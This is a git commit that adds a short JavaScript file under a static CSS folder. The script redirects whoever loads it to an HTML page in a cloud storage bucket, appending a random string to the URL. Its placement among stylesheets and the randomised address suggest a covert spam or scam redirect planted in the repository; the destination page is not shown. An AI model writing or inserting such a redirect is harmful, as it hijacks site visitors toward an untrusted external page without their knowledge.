5c36361e17028627d7afacddcea8278ffa67d13c
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-25 16:05:35 +0800

    Create qssj1.js

---
+++ static/css/qssj1.js
@@ -0,0 +1,15 @@
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/33d4f75756b24544847d8889231f5848.html#{nnnnnnn}{wwww}',];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
